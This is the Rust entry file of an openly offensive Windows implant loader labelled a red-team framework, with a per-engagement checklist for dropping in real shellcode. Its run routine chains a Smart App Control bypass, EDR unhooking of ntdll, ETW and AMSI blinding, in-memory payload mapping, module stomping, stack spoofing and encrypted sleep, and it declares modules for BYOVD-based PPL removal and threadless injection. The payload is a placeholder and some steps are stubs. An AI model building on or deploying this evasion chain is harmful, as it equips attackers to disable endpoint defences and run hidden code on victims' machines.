//! redcrab-rt — red team implant framework
//! Build: rustup override set nightly && cargo build --release --target x86_64-pc-windows-msvc
//!
//! Per-build checklist:
//!   1. Replace PAYLOAD with your actual shellcode/PE bytes
//!   2. Generate fresh SLEEP_KEY (16 random bytes)
//!   3. Verify SAC is Off in lab VM before testing
//!   4. cargo build --release

#![no_main]
#![allow(unused_imports, dead_code)]

// ---- module declarations ----------------------------------------------------
mod defs;
mod utils;
mod syscall;
mod loader;
mod stomp;
mod spoof;
mod sleep;
mod etw_patch;          // ETW-Ti + AMSI blind (from previous commit)
mod unhook;             // ntdll page-granular re-read
mod sac_bypass;         // NEW: Smart App Control bypass
mod ppldump;            // NEW: PPL removal via RTCore64 BYOVD
mod pe_obfuscate;       // NEW: compile-time XOR + import hash obfuscation
mod indirect_syscall;   // NEW: fully indirect syscalls (no syscall in our .text)
mod threadless_inject;  // NEW: EAT-hijack threadless injection

use defs::*;
use utils::djb2;

// ---- per-build configuration ------------------------------------------------

/// Replace with real shellcode before each engagement.
const PAYLOAD: &[u8] = &[0x90]; // NOP placeholder

/// 16 random bytes — regenerate per build for unique sleep-mask RC4 key.
const SLEEP_KEY: [u8; 16] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

// ---- entry point ------------------------------------------------------------

#[no_mangle]
pub extern "system" fn WinMainCRTStartup() {
    unsafe { run() };
}

unsafe fn run() {
    // 0. SAC bypass — clear WDAC process policy before any unsigned load
    sac_bypass::bypass_sac();

    // 1. Unhook ntdll — wipe EDR hooks by re-reading clean .text from disk
    unhook::unhook_ntdll();

    // 2. ETW + AMSI blind
    etw_patch::apply_all_blinds();

    // 3. Obfuscate PAYLOAD copy in memory using per-build XOR key
    let mut payload_buf = PAYLOAD.to_vec();
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    // Decode immediately before mapping
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);

    // 4. Resolve syscall stubs indirectly and map payload
    //    (wire up indirect_syscall::parse_stub for NtAllocateVirtualMemory
    //     then call loader::map_pe with the indirect gate)
    loader::map_pe(&payload_buf);

    // 5. Stomp decoy module, spoof call stack, enter encrypted sleep loop
    let pe_base = 0usize; // obtain from step 4
    stomp::stomp(0 as _, pe_base as _, payload_buf.len());
    spoof::spoof_stack();
    sleep::sleep_mask(30_000, &SLEEP_KEY);

    // Wipe plaintext payload copy
    pe_obfuscate::secure_zero(&mut payload_buf);
}
